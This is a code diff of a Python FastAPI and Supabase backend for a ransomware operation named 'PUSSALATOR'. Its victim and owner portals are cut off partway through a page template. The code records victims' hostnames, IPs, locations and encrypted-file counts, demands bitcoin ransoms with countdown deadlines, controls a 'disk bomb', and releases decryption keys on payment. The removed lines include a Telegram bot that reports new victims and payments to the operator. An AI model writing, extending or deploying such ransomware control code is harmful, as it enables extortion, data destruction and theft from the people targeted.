@@ -1,58 +1,42 @@
-#!/usr/bin/env python3
-"""
-PUSSALATOR - Supabase Backend with Owner ID Login
-FOR VM TESTING ONLY
-"""
-
 import os
 import json
 import random
 import string
 import hashlib
-import hmac
 from datetime import datetime, timedelta
 from typing import Optional, Dict, Any, List
 from contextlib import asynccontextmanager
 
 # FastAPI imports
-from fastapi import FastAPI, Request, Response, HTTPException, Depends, Cookie, status
+from fastapi import FastAPI, Request, Response, HTTPException, Depends
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 import uvicorn
 
 # Third party imports
 from supabase import create_client, Client
-import requests
 from pydantic import BaseModel
-from jose import JWTError, jwt
 
 # ============================================================================
 # CONFIGURATION
 # ============================================================================
 
 class Config:
-    SECRET_KEY = os.environ.get('SECRET_KEY', 'dev-key-change-this')
+    SECRET_KEY = os.environ.get('SECRET_KEY')
     
     # Supabase credentials
     SUPABASE_URL = os.environ.get('SUPABASE_URL')
     SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
     SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY')
-    SUPABASE_JWT_SECRET = os.environ.get('SUPABASE_JWT_SECRET')
     
     # Ransom settings
     DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT', '0.5 BTC')
-    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS', 'bc1q780u8tgzaelne6x7tc8j2ra39vn2sjmpwjaupyvyg47x56m4nedqslqjnm')
+    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS')
     DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS', 72))
     
     # Owner credentials - USING THE EXACT ID YOU SPECIFIED
     OWNER_ID = os.environ.get('OWNER_ID')
-    OWNER_EMAIL = os.environ.get('OWNER_EMAIL')
     OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
-
-    # Telegram Bot
-    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
-    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
     
     # Server settings
     DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
@@ -68,66 +52,6 @@ supabase: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)
 
 # Admin client (for privileged operations)
 supabase_admin: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_SERVICE_KEY)
-
-# ============================================================================
-# JWT BEARER AUTHENTICATION
-# ============================================================================
-
-class JWTBearer(HTTPBearer):
-    def __init__(self, auto_error: bool = True):
-        super(JWTBearer, self).__init__(auto_error=auto_error)
-
-    async def __call__(self, request: Request):
-        credentials: HTTPAuthorizationCredentials = await super(JWTBearer, self).__call__(request)
-        if credentials:
-            if not credentials.scheme == "Bearer":
-                raise HTTPException(
-                    status_code=status.HTTP_403_FORBIDDEN,
-                    detail="Invalid authentication scheme."
-                )
-            if not self.verify_jwt(credentials.credentials):
-                raise HTTPException(
-                    status_code=status.HTTP_403_FORBIDDEN,
-                    detail="Invalid token or expired token."
-                )
-            return credentials.credentials
-        else:
-            raise HTTPException(
-                status_code=status.HTTP_403_FORBIDDEN,
-                detail="Invalid authorization code."
-            )
-
-    def verify_jwt(self, jwtoken: str) -> bool:
-        try:
-            payload = jwt.decode(
-                jwtoken,
-                Config.SUPABASE_JWT_SECRET,
-                algorithms=["HS256"],
-                audience="authenticated"
-            )
-            return True
-        except JWTError:
-            return False
-
-# Dependency to get current user from JWT
-async def get_current_user(credentials: str = Depends(JWTBearer())):
-    try:
-        payload = jwt.decode(
-            credentials,
-            Config.SUPABASE_JWT_SECRET,
-            algorithms=["HS256"],
-            audience="authenticated"
-        )
-        return {
-            "id": payload.get("sub"),
-            "email": payload.get("email"),
-            "role": payload.get("role", "authenticated")
-        }
-    except JWTError:
-        raise HTTPException(
-            status_code=status.HTTP_403_FORBIDDEN,
-            detail="Invalid authentication credentials"
-        )
 
 # ============================================================================
 # PYDANTIC MODELS
@@ -164,101 +88,23 @@ class OwnerLogin(BaseModel):
     password: str
 
 class OwnerLoginResponse(BaseModel):
-    access_token: str
-    token_type: str = "bearer"
+    success: bool
+    access_token: Optional[str] = None
 
 class BombControl(BaseModel):
     victim_id: str
     filename: Optional[str] = "explosion.dat"
 
 # ============================================================================
-# TELEGRAM BOT
-# ============================================================================
-
-class TelegramBot:
-    """Telegram bot for notifications"""
-    
-    def __init__(self):
-        self.token = Config.TELEGRAM_BOT_TOKEN
-        self.chat_id = Config.TELEGRAM_CHAT_ID
-        self.enabled = bool(self.token and self.chat_id)
-        
-        if self.enabled:
-            test_msg = self.send("🔴 PUSSALATOR BACKEND STARTED", silent=True)
-            if test_msg:
-                print(f"[+] Telegram bot enabled - chat ID: {self.chat_id}")
-            else:
-                print("[-] Telegram bot configured but not working")
-                self.enabled = False
-        else:
-            print("[-] Telegram bot disabled - set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")
-    
-    def send(self, message: str, silent: bool = False) -> bool:
-        if not self.enabled:
-            return False
-        
-        try:
-            response = requests.post(
-                f"https://api.telegram.org/bot{self.token}/sendMessage",
-                json={
-                    'chat_id': self.chat_id,
-                    'text': f"<b>🔴 PUSSALATOR</b>\n\n{message}\n\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-                    'parse_mode': 'HTML',
-                    'disable_notification': silent
-                },
-                timeout=5
-            )
-            return response.status_code == 200
-        except Exception as e:
-            print(f"[-] Telegram error: {e}")
-            return False
-    
-    def notify_new_victim(self, victim_id: str, location: str, ip: str, hostname: str):
-        if not self.enabled:
-            return
-        self.send(f"""🔥 <b>NEW VICTIM</b>
-
-<b>ID:</b> <code>{victim_id}</code>
-<b>Hostname:</b> {hostname}
-<b>Location:</b> {location}
-<b>IP:</b> {ip}""")
-    
-    def notify_payment(self, victim_id: str, amount: str, tx_id: str):
-        if not self.enabled:
-            return
-        self.send(f"""💰 <b>PAYMENT RECEIVED</b>
-
-<b>ID:</b> <code>{victim_id}</code>
-<b>Amount:</b> {amount}
-<b>Transaction:</b> <code>{tx_id}</code>""")
-    
-    def notify_bomb_start(self, victim_id: str):
-        if not self.enabled:
-            return
-        self.send(f"""💣 <b>DISK BOMB ACTIVATED</b>
-
-<b>ID:</b> <code>{victim_id}</code>""")
-    
-    def notify_bomb_stop(self, victim_id: str):
-        if not self.enabled:
-            return
-        self.send(f"""⛓️ <b>BOMB STOPPED</b>
-
-<b>ID:</b> <code>{victim_id}</code>""")
-
-# Initialize Telegram bot
-telegram = TelegramBot()
-
-# ============================================================================
 # HELPER FUNCTIONS
 # ============================================================================
 
 def generate_victim_id() -> str:
-    """Generate random victim ID - matches client format"""
-    hostname = socket.gethostname()
+    """Generate random victim ID"""
+    chars = string.ascii_uppercase + string.digits
     timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
-    random_part = ''.join(random.choices('0123456789ABCDEF', k=8))
-    return f"{hostname}-{timestamp}-{random_part}"
+    random_part = ''.join(random.choices(chars, k=8))
+    return f"{timestamp}-{random_part}"
 
 def generate_encryption_key() -> str:
     """Generate encryption key"""
@@ -266,40 +112,87 @@ def generate_encryption_key() -> str:
     return Fernet.generate_key().decode()
 
 def get_stats() -> Dict[str, Any]:
-    """Get system statistics from Supabase"""
+    """Get REAL system statistics from Supabase"""
     try:
-        total = supabase_admin.table('victims').select('*', count='exact').execute()
-        paid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'paid').execute()
-        unpaid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'unpaid').execute()
-        expired = supabase_admin.table('victims').select('*', count='exact').eq('status', 'expired').execute()
+        # Get all victims
+        all_victims = supabase_admin.table('victims').select('*').execute()
+        victims = all_victims.data if all_victims.data else []
         
-        files_result = supabase_admin.table('victims').select('files').execute()
-        total_files = sum(v.get('files', 0) for v in files_result.data)
+        total = len(victims)
         
-        active_bombs = supabase_admin.table('victims').select('*', count='exact').eq('bomb_status', 'active').execute()
+        # Count by status
+        paid = 0
+        unpaid = 0
+        expired = 0
+        total_files = 0
+        active_bombs = 0
         
+        for v in victims:
+            # Count status
+            status = v.get('status', 'unknown')
+            if status == 'paid':
+                paid += 1
+            elif status == 'unpaid':
+                unpaid += 1
+            elif status == 'expired':
+                expired += 1
+            
+            # Sum files
+            files = v.get('files', 0)
+            if files:
+                try:
+                    total_files += int(files)
+                except:
+                    pass
+            
+            # Count active bombs
+            if v.get('bomb_status') == 'active':
+                active_bombs += 1
+        
+        # Count paid today
         today = datetime.now().date().isoformat()
-        paid_today = supabase_admin.table('victims').select('*', count='exact')\
-            .eq('status', 'paid')\
-            .gte('paid_at', f"{today}T00:00:00")\
-            .lte('paid_at', f"{today}T23:59:59")\
-            .execute()
+        paid_today = 0
+        for v in victims:
+            if v.get('status') == 'paid' and v.get('paid_at'):
+                paid_date = v['paid_at'][:10]  # YYYY-MM-DD
+                if paid_date == today:
+                    paid_today += 1
+        
+        print(f"[+] REAL STATS - Total: {total}, Paid: {paid}, Files: {total_files}")
         
         return {
-            'total': len(total.data),
-            'paid': len(paid.data),
-            'unpaid': len(unpaid.data),
-            'expired': len(expired.data),
+            'total': total,
+            'paid': paid,
+            'unpaid': unpaid,
+            'expired': expired,
             'total_files': total_files,
-            'active_bombs': len(active_bombs.data),
-            'paid_today': len(paid_today.data)
+            'active_bombs': active_bombs,
+            'paid_today': paid_today
         }
+        
     except Exception as e:
-        print(f"Stats error: {e}")
+        print(f"[-] Stats error: {e}")
         return {
-            'total': 0, 'paid': 0, 'unpaid': 0, 'expired': 0,
-            'total_files': 0, 'active_bombs': 0, 'paid_today': 0
+            'total': 0,
+            'paid': 0,
+            'unpaid': 0,
+            'expired': 0,
+            'total_files': 0,
+            'active_bombs': 0,
+            'paid_today': 0
         }
+
+def log_action(action: str, details: str, ip: str = None):
+    """Log system action"""
+    try:
+        supabase_admin.table('logs').insert({
+            'action': action,
+            'details': details,
+            'ip': ip or 'unknown',
+            'timestamp': datetime.utcnow().isoformat()
+        }).execute()
+    except:
+        pass
 
 # ============================================================================
 # FASTAPI APP INIT
@@ -307,29 +200,22 @@ def get_stats() -> Dict[str, Any]:
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
+    # Startup
     print("=" * 60)
-    print("PUSSALATOR - SUPABASE BACKEND")
+    print("PUSSALATOR - SUPABASE BACKEND (NO FAKE DATA)")
     print("=" * 60)
     print(f"Supabase URL: {Config.SUPABASE_URL}")
     print(f"Owner ID: {Config.OWNER_ID}")
-    print(f"Telegram: {'✅ ENABLED' if telegram.enabled else '❌ DISABLED'}")
     print("=" * 60)
     print("WARNING: For VM testing only!")
     print("=" * 60)
     
-    # Create owner user if not exists
+    # Test Supabase connection
     try:
-        owner = supabase_admin.auth.admin.get_user_by_email(Config.OWNER_EMAIL)
-        if not owner:
-            supabase_admin.auth.admin.create_user({
-                'email': Config.OWNER_EMAIL,
-                'password': Config.OWNER_PASSWORD,
-                'email_confirm': True,
-                'user_metadata': {'owner_id': Config.OWNER_ID}
-            })
-            print(f"[+] Owner user created: {Config.OWNER_EMAIL}")
+        test = supabase_admin.table('victims').select('*').limit(1).execute()
+        print("[+] Supabase connection OK")
     except Exception as e:
-        print(f"[-] Owner user may already exist")
+        print(f"[-] Supabase connection error: {e}")
     
     yield
     
@@ -352,7 +238,7 @@ app.add_middleware(
 )
 
 # ============================================================================
-# HTML TEMPLATES
+# HTML TEMPLATES (SIMPLIFIED)
 # ============================================================================
 
 LOGIN_PAGE = """
@@ -365,82 +251,61 @@ LOGIN_PAGE = """
     <style>
         * { box-sizing: border-box; }
         body {
-            background: #000000;
-            color: #33ff33;
-            font-family: 'Courier New', 'Terminal', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
             margin: 0;
-            padding: 0;
+            padding: 10px;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23000000"/><path d="M10 10 L90 10 M10 20 L90 20 M10 30 L90 30 M10 40 L90 40 M10 50 L90 50 M10 60 L90 60 M10 70 L90 70 M10 80 L90 80 M10 90 L90 90 M10 10 L10 90 M20 10 L20 90 M30 10 L30 90 M40 10 L40 90 M50 10 L50 90 M60 10 L60 90 M70 10 L70 90 M80 10 L80 90 M90 10 L90 90" stroke="%231a1a1a" stroke-width="0.5" fill="none"/></svg>');
         }
         .container {
             max-width: 600px;
             width: 100%;
             margin: 20px auto;
-            border: 3px solid #ff0000;
-            padding: 20px;
-            background: #0a0a0a;
-            box-shadow: 10px 10px 0 #660000;
-            position: relative;
-        }
-        .container:before {
-            content: "";
-            position: absolute;
-            top: 5px;
-            left: 5px;
-            right: -5px;
-            bottom: -5px;
-            background: #330000;
-            z-index: -1;
+            border: 2px solid #ff0000;
+            padding: 30px 20px;
+            background: #000000;
+            box-shadow: 0 0 20px #ff0000;
+            text-align: center;
         }
         h1 {
-            font-size: 48px;
+            font-size: 42px;
             color: #ff0000;
+            text-shadow: 0 0 10px #ff0000;
             margin: 10px 0;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 4px;
-            text-shadow: 3px 3px 0 #660000, 5px 5px 0 #330000;
-            font-family: 'Courier New', monospace;
+            animation: flicker 3s infinite;
         }
-        @media (max-width: 480px) { 
-            h1 { font-size: 36px; } 
+        @media (max-width: 480px) { h1 { font-size: 32px; } }
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.9; }
+            51% { opacity: 1; }
+            60% { opacity: 0.95; }
+            100% { opacity: 1; }
         }
         .subtitle {
             color: #ff6666;
             margin-bottom: 25px;
             font-size: 16px;
-            border-top: 1px solid #ff0000;
-            border-bottom: 1px solid #ff0000;
-            padding: 10px 0;
-            text-transform: uppercase;
-            font-weight: bold;
-            background: #1a0000;
+            border-bottom: 1px dashed #ff0000;
+            padding-bottom: 15px;
         }
         .ascii {
             color: #ff0000;
-            font-size: 12px;
+            font-size: 10px;
             line-height: 1.2;
             white-space: pre;
             margin: 15px 0;
             overflow-x: auto;
-            background: #000000;
-            padding: 10px;
-            border: 1px solid #330000;
         }
-        .input-group { 
-            margin: 30px 0; 
-            background: #1a0000;
-            padding: 20px;
-            border: 1px solid #330000;
-        }
+        .input-group { margin: 25px 0; }
         .input-field {
-            background: #000000;
+            background: #111;
             border: 2px solid #ff0000;
-            color: #33ff33;
+            color: #00ff00;
             padding: 12px 15px;
             font-family: 'Courier New', monospace;
             font-size: 16px;
@@ -452,48 +317,46 @@ LOGIN_PAGE = """
         }
         .input-field:focus {
             outline: none;
-            border-color: #ff6666;
-            background: #0a0a0a;
+            border-color: #00ff00;
+            box-shadow: 0 0 15px #ff0000;
         }
         .button {
-            background: #cc0000;
-            color: #000000;
-            border: 2px solid #ff0000;
+            background: #ff0000;
+            color: black;
+            border: none;
             padding: 12px 30px;
             font-family: 'Courier New', monospace;
             font-weight: bold;
             font-size: 16px;
             cursor: pointer;
             margin: 10px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
+            transition: 0.3s;
+            border-radius: 3px;
         }
         .button:hover {
-            background: #ff0000;
-            border-color: #ffffff;
+            background: #ff3333;
+            box-shadow: 0 0 15px #ff0000;
+            transform: scale(1.02);
         }
         .stats {
-            color: #ff9999;
+            color: #ff6666;
             margin-top: 25px;
-            font-size: 12px;
+            font-size: 13px;
             padding: 15px;
-            background: #0a0000;
-            border: 2px solid #330000;
-            font-family: 'Courier New', monospace;
+            background: #111;
+            border: 1px solid #330000;
+            border-radius: 5px;
         }
         .message {
             color: #ff6666;
             margin-top: 15px;
             min-height: 25px;
             font-size: 14px;
-            font-weight: bold;
         }
         .footer {
             margin-top: 20px;
-            font-size: 9px;
-            color: #330000;
-            border-top: 1px solid #330000;
-            padding-top: 10px;
+            font-size: 10px;
+            color: #333;
         }
         .stats-grid {
             display: grid;
@@ -504,118 +367,130 @@ LOGIN_PAGE = """
         .stat-item {
             background: #1a0000;
             padding: 8px;
-            border: 1px solid #330000;
+            border-radius: 3px;
         }
         .stat-label {
-            font-size: 10px;
-            color: #cc6666;
-            text-transform: uppercase;
+            font-size: 11px;
+            color: #ff9999;
         }
         .stat-number {
-            font-size: 24px;
+            font-size: 18px;
             color: #ff0000;
             font-weight: bold;
-            font-family: 'Courier New', monospace;
-        }
-        .blink {
-            animation: blink 2s step-end infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="ascii">
-    ,     ,                   
-    |\\---/|                   
-   /  , ,  \                  
-  =||  =  ||=                 
-    ||___||                   
-    /     \\                   
-   (_______)
+    /\\____/\\    
+   (  o  o  )   
+   (   ==   )   
+    (______)    
         </div>
         
         <h1>PUSSALATOR</h1>
-        <div class="subtitle">>> ENTER ACCESS ID <<</div>
+        <div class="subtitle">> ENTER ACCESS ID <</div>
         
         <div class="input-group">
-            <input type="text" id="access_id" class="input-field" placeholder="_" autocomplete="off" onkeypress="handleKey(event)">
-            <button class="button" onclick="submitId()">>> SUBMIT <<</button>
+            <input type="text" id="access_id" class="input-field" placeholder="ENTER ID" autocomplete="off" onkeypress="handleKey(event)">
+            <button class="button" onclick="submitId()">SUBMIT</button>
         </div>
         
         <div id="message" class="message"></div>
         
         <div class="stats" id="stats">
-            <span class="blink">></span> Loading system data...
+            <div>Loading system data...</div>
         </div>
         
         <div class="footer">
-            SYSTEM v1.0 | FOR VM TESTING ONLY | 2000
+            SYSTEM v1.0 | FOR VM TESTING ONLY
         </div>
     </div>
 
     <script>
+        const OWNER_ID = '40671Mps19*';
+        
         function handleKey(e) {
             if (e.key === 'Enter') {
                 submitId();
             }
         }
         
-        function submitId() {
-            var id = document.getElementById('access_id').value.trim();
-            var messageDiv = document.getElementById('message');
+        async function submitId() {
+            const id = document.getElementById('access_id').value.trim();
+            const messageDiv = document.getElementById('message');
             
             if (!id) {
-                messageDiv.innerHTML = '> ERROR: Please enter an ID';
+                messageDiv.innerHTML = 'Please enter an ID';
                 return;
             }
             
-            fetch('/api/victim/' + id)
-                .then(function(response) {
-                    if (response.status === 200) {
-                        window.location.href = '/victim/' + id;
+            // Check if it's the owner ID
+            if (id === OWNER_ID) {
+                const password = prompt('Enter owner password:');
+                if (!password) return;
+                
+                try {
+                    const response = await fetch('/api/owner/login', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({owner_id: id, password: password})
+                    });
+                    
+                    const data = await response.json();
+                    if (data.success) {
+                        window.location.href = '/owner/dashboard';
                     } else {
-                        messageDiv.innerHTML = '> ERROR: Invalid ID';
-                        document.getElementById('access_id').value = '';
+                        messageDiv.innerHTML = 'Invalid password';
                     }
-                })
-                .catch(function() {
-                    messageDiv.innerHTML = '> ERROR: Connection failed';
-                });
+                } catch(e) {
+                    messageDiv.innerHTML = 'Connection error';
+                }
+                return;
+            }
+            
+            // Check if it's a victim ID
+            try {
+                const response = await fetch(`/api/victim/${id}`);
+                if (response.status === 200) {
+                    window.location.href = `/victim/${id}`;
+                } else {
+                    messageDiv.innerHTML = 'Invalid ID';
+                    document.getElementById('access_id').value = '';
+                }
+            } catch(e) {
+                messageDiv.innerHTML = 'Connection error';
+            }
         }
         
-        function loadStats() {
-            fetch('/api/stats')
-                .then(function(response) { return response.json(); })
-                .then(function(stats) {
-                    document.getElementById('stats').innerHTML = '' +
-                        '<div class="stats-grid">' +
-                        '<div class="stat-item">' +
-                        '<div class="stat-label">TOTAL</div>' +
-                        '<div class="stat-number">' + stats.total + '</div>' +
-                        '</div>' +
-                        '<div class="stat-item">' +
-                        '<div class="stat-label">PAID</div>' +
-                        '<div class="stat-number">' + stats.paid + '</div>' +
-                        '</div>' +
-                        '<div class="stat-item">' +
-                        '<div class="stat-label">ACTIVE</div>' +
-                        '<div class="stat-number">' + stats.active_bombs + '</div>' +
-                        '</div>' +
-                        '</div>' +
-                        '<div style="margin-top: 10px; font-size: 10px;">' +
-                        'FILES ENCRYPTED: ' + stats.total_files.toLocaleString() +
-                        '</div>' +
-                        '<div style="margin-top: 5px; font-size: 10px;">' +
-                        'PAID TODAY: ' + stats.paid_today +
-                        '</div>';
-                })
-                .catch(function() {
-                    document.getElementById('stats').innerHTML = '> SYSTEM DATA UNAVAILABLE';
-                });
+        async function loadStats() {
+            try {
+                const response = await fetch('/api/stats');
+                const stats = await response.json();
+                
+                document.getElementById('stats').innerHTML = `
+                    <div class="stats-grid">
+                        <div class="stat-item">
+                            <div class="stat-label">TOTAL</div>
+                            <div class="stat-number">${stats.total}</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-label">PAID</div>
+                            <div class="stat-number">${stats.paid}</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-label">ACTIVE</div>
+                            <div class="stat-number">${stats.active_bombs || 0}</div>
+                        </div>
+                    </div>
+                    <div style="margin-top: 10px; font-size: 11px;">
+                        Files encrypted: ${(stats.total_files || 0).toLocaleString()}
+                    </div>
+                `;
+            } catch(e) {
+                document.getElementById('stats').innerHTML = 'System data unavailable';
+            }
         }
         
         loadStats();
@@ -629,141 +504,126 @@ VICTIM_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PUSSALATOR - VICTIM ACCESS</title>
+    <title>Victim Status - PUSSALATOR</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { box-sizing: border-box; }
         body {
-            background: #000000;
-            color: #33ff33;
-            font-family: 'Courier New', 'Terminal', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
             margin: 0;
-            padding: 0;
+            padding: 15px;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 50 50"><rect width="50" height="50" fill="%23000000"/><circle cx="25" cy="25" r="1" fill="%231a0000"/></svg>');
         }
         .container {
             max-width: 700px;
             width: 100%;
             margin: 20px auto;
-            border: 3px solid #ff0000;
-            padding: 20px;
-            background: #0a0a0a;
-            box-shadow: 10px 10px 0 #660000;
-            position: relative;
-        }
-        .container:before {
-            content: "VICTIM";
-            position: absolute;
-            top: -10px;
-            left: 20px;
+            border: 2px solid #ff0000;
+            padding: 25px 20px;
             background: #000000;
-            color: #ff0000;
-            padding: 0 10px;
-            font-size: 12px;
-            font-weight: bold;
+            box-shadow: 0 0 20px #ff0000;
         }
         h1 {
             color: #ff0000;
             text-align: center;
             font-size: 32px;
             margin: 5px 0 20px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            border-bottom: 2px solid #330000;
-            padding-bottom: 10px;
+            text-shadow: 0 0 8px #ff0000;
         }
         @media (max-width: 480px) { h1 { font-size: 24px; } }
         .info-box {
-            background: #0a0000;
-            border: 2px solid #330000;
+            background: #111;
+            border: 1px solid #330000;
             padding: 15px;
             margin: 15px 0;
+            border-radius: 5px;
             font-size: 14px;
+            line-height: 1.6;
         }
         .info-row {
             display: flex;
             justify-content: space-between;
             padding: 5px 0;
-            border-bottom: 1px dotted #330000;
+            border-bottom: 1px solid #222;
         }
         .info-label {
-            color: #cc6666;
+            color: #ff9999;
             font-weight: bold;
-            text-transform: uppercase;
         }
         .info-value {
-            color: #33ff33;
+            color: #00ff00;
             word-break: break-word;
             text-align: right;
-            font-family: 'Courier New', monospace;
         }
         .key-box {
-            background: #001100;
-            border: 2px solid #33ff33;
+            background: #003300;
+            border: 2px solid #00ff00;
             padding: 20px;
             margin: 20px 0;
             word-break: break-all;
             font-family: monospace;
             font-size: 14px;
-            color: #33ff33;
+            border-radius: 5px;
+            color: #00ff00;
         }
         .status-box {
             text-align: center;
             padding: 20px;
             margin: 15px 0;
-            font-size: 28px;
+            border-radius: 5px;
+            font-size: 24px;
             font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 4px;
         }
         .status-paid {
-            background: #001100;
-            color: #33ff33;
-            border: 3px solid #33ff33;
+            background: #003300;
+            color: #00ff00;
+            border: 2px solid #00ff00;
         }
         .status-unpaid {
-            background: #221100;
-            color: #ffaa00;
-            border: 3px solid #ffaa00;
+            background: #333300;
+            color: #ffff00;
+            border: 2px solid #ffff00;
         }
         .status-expired {
-            background: #220000;
+            background: #330000;
             color: #ff6666;
-            border: 3px solid #ff6666;
+            border: 2px solid #ff6666;
         }
         .timer {
-            font-size: 48px;
+            font-size: 36px;
             text-align: center;
             color: #ff0000;
             margin: 20px 0;
-            padding: 20px;
+            padding: 15px;
             background: #1a0000;
-            border: 2px solid #ff0000;
+            border-radius: 5px;
             font-weight: bold;
-            font-family: 'Courier New', monospace;
         }
-        @media (max-width: 480px) { .timer { font-size: 36px; } }
+        @media (max-width: 480px) { .timer { font-size: 28px; } }
         .button {
-            background: #cc0000;
-            color: #000000;
-            border: 2px solid #ff0000;
-            padding: 10px 20px;
+            background: #ff0000;
+            color: black;
+            border: none;
+            padding: 12px 25px;
             font-family: 'Courier New', monospace;
             font-weight: bold;
             font-size: 14px;
             cursor: pointer;
             margin: 10px 5px;
-            text-transform: uppercase;
+            border-radius: 3px;
+            transition: 0.3s;
         }
         .button:hover {
-            background: #ff0000;
+            background: #ff3333;
+            box-shadow: 0 0 15px #ff0000;
         }
-        .button-small { padding: 5px 10px; font-size: 11px; }
+        .button-small { padding: 8px 15px; font-size: 12px; }
         .back-link {
             display: inline-block;
             margin-top: 20px;
@@ -771,119 +631,117 @@ VICTIM_PAGE_TEMPLATE = """
             text-decoration: none;
             font-size: 14px;
             padding: 8px 15px;
-            border: 2px solid #ff6666;
-            text-transform: uppercase;
+            border: 1px solid #ff6666;
+            border-radius: 3px;
         }
         .back-link:hover {
             background: #ff0000;
-            color: #000000;
+            color: black;
             border-color: #ff0000;
         }
         .btc-address {
-            background: #111111;
-            padding: 15px;
+            background: #222;
+            padding: 10px;
             font-family: monospace;
             font-size: 14px;
             color: #ffaa00;
             word-break: break-all;
-            border: 2px solid #ffaa00;
+            border-radius: 3px;
             margin: 10px 0;
         }
-        .warning {
-            color: #ff0000;
-            text-align: center;
+        .copy-btn {
+            background: #333;
+            color: #ff6666;
+            border: 1px solid #ff6666;
+            padding: 5px 10px;
             font-size: 12px;
-            margin-top: 10px;
-            border: 1px solid #ff0000;
-            padding: 5px;
-            background: #1a0000;
+            cursor: pointer;
+            border-radius: 3px;
+        }
+        .copy-btn:hover {
+            background: #ff0000;
+            color: black;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1> >> VICTIM PORTAL << </h1>
-        <div id="content" style="min-height: 200px;">> LOADING...</div>
+        <h1>🔐 VICTIM PORTAL</h1>
+        <div id="content" style="min-height: 200px;">Loading...</div>
         <div style="text-align: center;">
-            <a href="/" class="back-link"><< BACK TO LOGIN >></a>
+            <a href="/" class="back-link">← BACK TO LOGIN</a>
         </div>
-        <div class="warning">ALL FILES ENCRYPTED. DO NOT ATTEMPT TO DECRYPT.</div>
     </div>
 
     <script>
-        var VICTIM_ID = '{{ victim_id }}';
+        const VICTIM_ID = '{{ victim_id }}';
         
-        function loadStatus() {
-            fetch('/api/victim/' + VICTIM_ID)
-                .then(function(response) {
-                    if (!response.ok) throw new Error('Not found');
-                    return response.json();
-                })
-                .then(function(v) {
-                    var html = '<div class="info-box">';
-                    html += '' +
-                        '<div class="info-row"><span class="info-label">VICTIM ID:</span><span class="info-value">' + v.id + '</span></div>' +
-                        '<div class="info-row"><span class="info-label">HOSTNAME:</span><span class="info-value">' + (v.hostname || 'UNKNOWN') + '</span></div>' +
-                        '<div class="info-row"><span class="info-label">IP ADDRESS:</span><span class="info-value">' + (v.ip || '0.0.0.0') + '</span></div>' +
-                        '<div class="info-row"><span class="info-label">LOCATION:</span><span class="info-value">' + (v.city || 'UNKNOWN') + ', ' + (v.country || 'UNKNOWN') + '</span></div>' +
-                        '<div class="info-row"><span class="info-label">FILES ENCRYPTED:</span><span class="info-value">' + (v.files || 0).toLocaleString() + '</span></div>' +
-                        '<div class="info-row"><span class="info-label">OS:</span><span class="info-value">' + (v.os || 'UNKNOWN') + '</span></div>' +
-                        '<div class="info-row" style="margin-top:10px;border-top:2px solid #ff0000;padding-top:10px;">' +
-                        '<span class="info-label">RANSOM:</span><span class="info-value" style="color:#ffaa00;">' + v.ransom + '</span></div>' +
-                        '<div class="info-row">' +
-                        '<span class="info-label">BTC ADDRESS:</span><span class="info-value" style="font-size:11px;">' + v.wallet + '</span></div>' +
-                    '</div>';
-                    
-                    if (v.status === 'paid') {
-                        html += '<div class="status-box status-paid">>> PAID <<</div>';
-                        if (v.key) {
-                            html += '<div class="key-box"><strong>DECRYPTION KEY:</strong><br><br>' + v.key + '</div>';
-                            html += '<div style="text-align:center;"><button class="button button-small" onclick="copyKey(\'' + v.key + '\')">[ COPY KEY ]</button></div>';
-                        }
-                    } else if (v.status === 'expired') {
-                        html += '<div class="status-box status-expired">>> EXPIRED <<</div>';
-                    } else {
-                        html += '<div class="status-box status-unpaid">>> UNPAID <<</div>';
-                        html += '<div class="btc-address" id="btcAddress">' + v.wallet + '</div>';
-                        html += '<div style="text-align:center;"><button class="button button-small" onclick="copyBtc()">[ COPY BTC ]</button></div>';
-                        html += '<div class="timer" id="timer">--:--:--</div>';
+        async function loadStatus() {
+            try {
+                const response = await fetch(`/api/victim/${VICTIM_ID}`);
